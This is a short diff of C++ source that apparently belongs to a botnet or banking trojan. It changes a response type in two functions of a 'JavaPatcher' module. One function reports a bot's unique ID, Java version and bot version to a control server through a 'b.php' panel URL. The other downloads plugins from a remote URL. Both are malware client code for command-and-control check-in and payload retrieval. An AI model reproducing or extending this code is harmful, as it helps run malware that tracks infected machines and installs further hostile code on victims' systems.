@@ -216,7 +216,7 @@ static void SendLogToAdmin( int num )
 	char qr[128];
 	fwsprintfA pwsprintfA = Get_wsprintfA();
 	pwsprintfA( qr, "%sb.php?uid=%s&c=setup_patch&v=%d&jv=%d&botver=%s", domain, BOT_UID, num, javaVersion2, versionPatch  );
-	THTTPResponse Response;
+	THTTPResponseRec Response;
 	ClearStruct(Response);
 	HTTP::Get( qr, 0, &Response );
 	DBG( "JavaPatcher", "Отсылка лога: %s", qr );
@@ -363,7 +363,7 @@ static char* DownloadPlugin( char *url, DWORD *dwLen, bool crypt )
 {
 	PCHAR data = 0;
 	DBG( "JavaPatcher", "DownloadPlugin %s", url );
-	THTTPResponse Response;
+	THTTPResponseRec Response;
 	ClearStruct(Response);
 	HTTP::Get( url, &data, &Response );
 	*dwLen = Response.ContentLength;
